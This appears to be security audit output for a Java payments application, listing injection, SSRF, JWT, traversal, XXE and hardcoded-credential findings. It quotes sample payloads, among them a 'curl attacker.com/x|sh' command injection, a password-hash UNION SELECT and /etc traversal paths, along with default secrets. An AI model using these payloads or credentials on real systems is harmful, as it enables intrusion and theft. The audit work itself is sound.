extra.message: findReferencesForCompany() builds a native SQL query by directly concatenating the user-supplied `fragment` (and `companyId`) into the query string via em.createNativeQuery(...). `fragment` originates from the unauthenticated-shape JSON body field `reference` in PaymentController.referenceCheck -> PaymentSearchService.referenceMatches, with no escaping or parameter binding. An attacker can break out of the LIKE '%...%' clause (e.g. reference="' UNION SELECT password_hash FROM users --") to read arbitrary data or manipulate the query.

renderAdvicePacket() builds a shell command by string-concatenating `source` (derived from the client-supplied `packetRef` in DocumentController.advicePacket, resolved with baseDir.resolve(packetRef) and NO startsWith(baseDir) containment check, unlike sibling methods) directly into `sh -c "soffice ... --outdir <outDir> <source>"` passed to ProcessBuilder. A packetRef containing shell metacharacters (e.g. `; curl attacker.com/x|sh #`) achieves OS command injection/RCE.

applyFormula() compiles and executes the raw client-supplied `formula` string (from PricingPreviewController's `formula` request parameter) with MVEL.executeExpression(MVEL.compileExpression(formula), ...). MVEL expressions can invoke arbitrary Java (reflection, ProcessBuilder, etc.), so this is a code-execution sink fed directly by HTTP input, allowing remote code execution.

renderWording() compiles the fully client-controlled `wording` string (from POST /api/notifications/preview body field `wording`, no @PreAuthorize restriction) as a FreeMarker template and executes it with tpl.process(...). FreeMarker templates can invoke `freemarker.template.utility.Execute` or other utility classes to run arbitrary OS commands, giving an authenticated user of any role server-side template injection leading to remote code execution.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

extra.message: importRemittanceAdvice() passes the client-supplied `adviceUri` (from request body field `adviceLocation` in DocumentController.importAdvice, no allowlist/host validation) straight to RestClient.create().get().uri(adviceUri)..., letting any authenticated user force the server to issue outbound HTTP requests to arbitrary hosts, including internal-only services and cloud metadata endpoints.

sendParseAck() opens an HttpURLConnection to `ackEp`, which is taken verbatim from the uploaded CSV's `ackEndpoint` column (BulkFileService.parse, line 101) with no host/scheme validation. Any user who can upload a bulk payment file controls a URL the server will POST to, enabling SSRF against internal infrastructure.

The `/api/documents/shared` endpoint (permitAll in SecurityConfig) decodes the client-supplied `link` JWT with com.auth0.jwt.JWT.decode(link), which only base64-decodes the token and never verifies its signature. An attacker can mint an arbitrary unsigned/garbage-signed JWT with any `coreCompanyId` claim to list and (via the download endpoint) exfiltrate every document belonging to any company.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: pictureFor() verifies the partner hand-off token with Jwts.parserBuilder()...parseClaimsJwt(handoff), the JJWT method for UNSIGNED JWTs. It rejects a properly signed token (throwing UnsupportedJwtException) and only succeeds on an alg="none" token, so the configured signingKey never actually verifies anything for a token that parses successfully. An attacker can craft an unsigned JWT with an arbitrary `sub` (coreCompanyId) and pull any company's accounts/payments via GET /api/partner-feeds/accounts/{handoff} (permitAll route).

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: forCo(coId) returns the full document list for ANY company id supplied in the path, with no check that the requesting user belongs to that company or holds a bank staff role (contrast with DocumentService.get()/openForDownload(), which do check company ownership). Any authenticated user (e.g. company_maker) can enumerate `coId` to read other companies' document metadata, and documents returned here contain the storedPath/id subsequently usable with /api/documents/{id}/download.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: stagedFileInfo(rel) resolves the client-supplied `ref` request parameter against baseDir with `baseDir.resolve(rel)` and reads file attributes, but unlike every other method in this class it never calls .normalize() or checks resolved.startsWith(baseDir). A value like `../../../../etc/passwd` lets any authenticated user probe for the existence/size/mtime of arbitrary files on the server filesystem.

saveStatement() writes the generated CSV to `Paths.get(statementDir, statementName)` using the client-supplied `statementName` request parameter with no sanitization, normalization, or containment check. A value such as `../../../../etc/cron.d/x` or an absolute path lets an authenticated company user make the server write a file anywhere it has filesystem permissions for.

cwe: CWE-73: External Control of File Name or Path

extra.message: resolve(ref) builds the LDAP search filter by concatenating the client-supplied `ref` (the `X-Corp-Directory-Ref` HTTP header forwarded from UserAdminController.invite) directly into "(&(objectClass=person)(uid=" + ref + "))" with no escaping of LDAP special characters. An attacker can inject filter metacharacters (e.g. `*)(uid=*))(|(uid=*`) to broaden or alter the search and potentially resolve an arbitrary directory entry/email for the invite flow.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query (LDAP Injection)

extra.message: applyHandoff() parses the client-supplied XML body (POST /api/partner-feeds/handoff, permitAll route) with `new org.dom4j.io.SAXReader().read(...)` without disabling DOCTYPE declarations or external entity resolution. This default configuration is vulnerable to XML External Entity injection, allowing local file disclosure or SSRF via a crafted DOCTYPE/ENTITY in the submitted XML.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: updateOwnCredential() only checks that request.currentPassword() is non-blank; it never calls passwordEncoder.matches(request.currentPassword(), user.getPasswordHash()) before overwriting the password hash. Any request that can reach POST /api/me/credential with the victim's valid session token (e.g. via a stolen/fixated session, CSRF-like reuse, or a logged-in but unattended session) can change the password by supplying any arbitrary non-blank string as `currentPassword`, without knowing the real one.

StaffBootstrapRunner creates a bank_admin account with username default `recon.lead` and password default `Recon!Ledger#2024` hardcoded as the @Value fallback if `app.staff-bootstrap.*` properties are not set. If a deployment relies on the defaults, a privileged bank_admin account exists with a publicly-known credential embedded in source control.
The `desk-model.api-key` property defaults to the hardcoded string `desk-model-dev-key-4d8f`, used to authenticate to the internal model gateway when no external configuration is supplied.

The `legacy-report-bridge.intake-key` property defaults to the hardcoded string `legacy-bridge-dev-key-9c1e`, used as a shared secret authenticating calls to the internal reporting bridge when no external configuration is supplied.
